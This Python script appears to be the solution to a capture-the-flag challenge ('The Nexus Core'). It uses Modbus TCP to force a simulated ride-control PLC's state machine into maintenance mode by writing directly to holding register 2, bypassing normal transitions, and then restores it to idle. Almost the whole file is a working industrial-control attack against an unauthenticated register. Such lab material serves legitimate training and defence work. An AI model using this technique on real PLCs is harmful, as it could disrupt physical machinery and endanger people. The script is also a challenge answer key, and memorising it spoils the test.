#!/usr/bin/env python3
"""
Challenge 10: The Nexus Core (450 points)
Difficulty: Hard

Objective: Force the Main PLC state machine directly into state 5 (MAINTENANCE mode)
during operation.

Requirements:
- Write state 5 to state register via Modbus (MW2)
- Can be done during any state

Educational Value:
- Learn state machine manipulation
- Understand PLC control flow
- Practice direct register manipulation
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def force_maintenance_mode():
    """
    Force PLC into maintenance mode
    """
    print("=" * 60)
    print("Challenge 10: The Nexus Core")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Read current state
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    current_state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency', 'Maintenance']
    print(f"Current State: {current_state} ({state_names[current_state] if current_state < len(state_names) else 'Unknown'})")
    print()

    print("State Machine Map:")
    print("  0 = Idle")
    print("  1 = Starting")
    print("  2 = Running")
    print("  3 = Stopping")
    print("  4 = Emergency")
    print("  5 = Maintenance  ← TARGET")
    print()

    if current_state == 5:
        print("⚠️  Already in maintenance mode!")
        print("   Stop the ride and let it return to Idle, then try again.")
        client.close()
        return False

    print("⚠️  WARNING: Forcing state machine to MAINTENANCE mode!")
    print("   This bypasses normal state transitions.")
    print()

    print("Executing attack...")
    print("  → Writing 5 to state register (MW2)")

    # Force state to 5 (Maintenance)
    result = client.write_register(2, 5, slave=1)
    if not result.isError():
        print("  ✓ State register overwritten!")
        print()

        # Verify state change
        time.sleep(0.5)
        result = client.read_holding_registers(2, 1, slave=1)
        if not result.isError():
            new_state = result.registers[0]
            print(f"Verified New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")

            if new_state == 5:
                print()
                print("✓ Successfully forced MAINTENANCE mode!")
                print()
                print("⚠️  State machine has been compromised!")
                print("   The PLC is now in an unexpected state.")
                print()
                print("🎯 Challenge 10 should now be completed!")
                print("   Check the CTF dashboard to verify.")

                # Restore to idle after a moment
                time.sleep(2)
                print()
                print("Restoring to IDLE state...")
                client.write_register(2, 0, slave=1)
                print("✓ State restored to IDLE")

                client.close()
                return True
            else:
                print()
                print("⚠️  State did not change as expected.")
                print("   PLC may have validation logic preventing this.")

    else:
        print("  ✗ Failed to write register")
        client.close()
        return False

    client.close()
    return False

if __name__ == "__main__":
    try:
        force_maintenance_mode()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
